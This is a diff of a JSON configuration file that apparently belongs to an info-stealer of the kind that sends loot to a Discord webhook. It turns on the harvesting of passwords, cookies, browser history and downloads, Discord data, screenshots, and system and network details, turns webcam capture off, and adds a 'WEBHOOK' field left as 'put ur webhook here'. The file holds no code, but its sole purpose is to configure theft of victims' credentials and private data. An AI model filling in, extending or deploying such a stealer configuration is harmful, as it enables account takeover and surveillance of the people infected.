@@ -1,13 +1,14 @@
 {
-  "user_info": true,
-  "os_info": true,
-  "system_info": true,
-  "network_info": true,
-  "discord_info": true,
-  "webcam_photo": true,
-  "screenshot": true,
-  "password": true,
-  "browser_downloads": true,
-  "browser_history": true,
-  "cookies": true
+    "user_info": true,
+    "os_info": true,
+    "system_info": true,
+    "network_info": true,
+    "discord_info": true,
+    "webcam_photo": false,
+    "screenshot": true,
+    "password": true,
+    "browser_downloads": true,
+    "browser_history": true,
+    "cookies": true,
+    "WEBHOOK": "put ur webhook here"
 }
